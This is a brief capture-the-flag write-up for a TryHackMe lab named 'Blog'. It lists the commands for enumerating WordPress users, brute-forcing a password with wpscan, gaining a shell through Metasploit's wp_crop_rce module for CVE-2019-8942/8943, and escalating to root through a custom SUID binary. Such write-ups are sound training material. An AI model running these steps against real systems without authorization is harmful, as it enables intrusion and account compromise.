Blog

TryHackMe, Easy

Blog exploits WordPress 5.0 (CVE-2019-8942/8943, Metasploit's wp_crop_rce) after enumerating users and cracking a password, ending with escalation via a custom SUID binary.

Reconnaissance

Nmap reveals SSH, HTTP and Samba. WordPress users are enumerated via the REST API and kwheel's password is cracked with wpscan.

nmap -sS -sV -Pn <IP>
curl http://blog.thm/wp-json/wp/v2/users
wpscan --url http://blog.thm -U kwheel -P rockyou.txt

Exploitation

With valid credentials, Metasploit's wp_crop_rce module delivers code execution and a shell as www-data.

msfconsole
use exploit/multi/http/wp_crop_rce
set RHOSTS <IP>
set VHOST blog.thm
set USERNAME kwheel
set PASSWORD <PASSWORD>
run

Privilege escalation

Searching for SUID binaries highlights /usr/sbin/checker. Analysis with ltrace shows it reads the admin environment variable; setting it yields a root shell.

find / -perm -u=s -type f 2>/dev/null
ltrace /usr/sbin/checker
export admin=1
/usr/sbin/checker
cat /root/root.txt
